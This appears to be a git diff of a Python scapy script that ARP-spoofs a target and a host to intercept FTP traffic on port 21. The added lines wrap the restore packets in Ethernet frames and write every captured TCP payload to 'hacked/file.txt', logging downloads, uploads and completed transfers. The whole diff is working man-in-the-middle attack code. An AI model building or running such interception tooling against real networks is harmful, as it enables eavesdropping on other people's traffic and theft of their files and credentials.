@@ -17,10 +17,12 @@ mac_target = sys.argv[4]
 def restore_spoofing():
 	print("Restoring default ARP..")
 	packet = scapy.ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src)
-	scapy.send(packet, verbose=False)
+	ethernet_frame = scapy.Ether(dst=mac_src) / packet
+	scapy.send(ethernet_frame, verbose=False)
 
 	packet = scapy.ARP(op=2, pdst=ip_src, hwdst=mac_src, psrc=ip_target, hwsrc=mac_target)
-	scapy.send(packet, verbose=False)
+	ethernet_frame = scapy.Ether(dst=mac_target) / packet
+	scapy.send(ethernet_frame, verbose=False)
 
 
 def spoofing(ip_dst, mac_dst, ip_src):
@@ -32,10 +34,17 @@ def spoofing(ip_dst, mac_dst, ip_src):
 def packet_callback(packet):
 	if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
 		payload = packet[scapy.Raw].load
+
 		if b"RETR" in payload:
 			print(f"Downloading: {payload.decode()[5:-2]}")
 		elif b"STOR" in payload:
 			print(f"Uploading: {payload.decode()[5:-2]}")
+
+		with open("hacked/file.txt", 'ab') as f:
+			f.write(payload)
+
+		if "F" in str(packet[scapy.TCP].flags):
+			print(f"File transferred: {payload.decode()[5:-2]}")
 
 
 scapy.sniff(iface="eth0", prn=packet_callback, filter="tcp port 21")
